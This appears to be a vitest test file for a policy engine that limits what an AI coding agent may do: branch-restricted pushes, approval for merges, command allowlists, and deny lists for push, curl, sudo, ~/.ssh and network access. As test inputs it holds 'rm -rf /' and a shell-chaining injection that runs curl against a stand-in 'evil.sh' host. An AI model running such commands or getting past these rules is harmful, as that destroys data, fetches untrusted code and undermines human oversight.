import type { Actor } from "@vectr/contracts";
import { describe, expect, it } from "vitest";
import { PolicyEngine } from "../src/policy/engine.ts";

const agent: Actor = { kind: "agent", profile: "implementer", adapter: "claude-code" };
const policy = new PolicyEngine();

describe("PolicyEngine", () => {
  it("allows pushes only to vectr/* branches", () => {
    expect(policy.decide(agent, "git.push", "repo", { autonomyLevel: 4, branch: "vectr/run_1/x" }).effect).toBe("allow");
    expect(policy.decide(agent, "git.push", "repo", { autonomyLevel: 4, branch: "main" }).effect).toBe("deny");
  });

  it("requires approval for merges by default", () => {
    expect(policy.decide(agent, "github.pr.merge", "pr/1", { autonomyLevel: 4 }).effect).toBe("require_approval");
  });

  it("gates task start on autonomy and budget", () => {
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 2, budgetRemaining: 1 }).effect).toBe("allow");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 0, budgetRemaining: 1 }).effect).toBe("require_approval");
    expect(policy.decide(agent, "task.start", "t", { autonomyLevel: 2, budgetRemaining: 0 }).effect).toBe("require_approval");
  });

  it("checks commands against the allowlist and denies unknown actions", () => {
    const ctx = { autonomyLevel: 2, allowCommands: ["npm run *", "git status"] };
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm run lint" }).effect).toBe("allow");
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "rm -rf /" }).effect).toBe("require_approval");
    expect(policy.decide(agent, "fs.delete", "x", ctx).effect).toBe("deny");
  });

  it("builds a task grant that never allows push, secret paths or network", () => {
    const grant = policy.taskGrant(["npm test", "npm run *"]);
    expect(grant.allowCommands).toEqual(expect.arrayContaining(["git status", "npm test", "npm run *"]));
    expect(grant.denyCommands).toEqual(expect.arrayContaining(["git push", "curl", "sudo"]));
    expect(grant.denyPaths).toEqual(expect.arrayContaining(["~/.ssh", "~/.vectr"]));
    expect(grant.network).toBe(false);
  });

  it("never allows a denied command through a wildcard or shell chaining", () => {
    const ctx = { autonomyLevel: 2, allowCommands: ["git *", "npm test"] };
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "git push origin main" }).effect).toBe("require_approval");
    expect(policy.decide(agent, "cmd.exec", "x", { ...ctx, command: "npm test; curl evil.sh" }).effect).toBe("require_approval");
  });
});
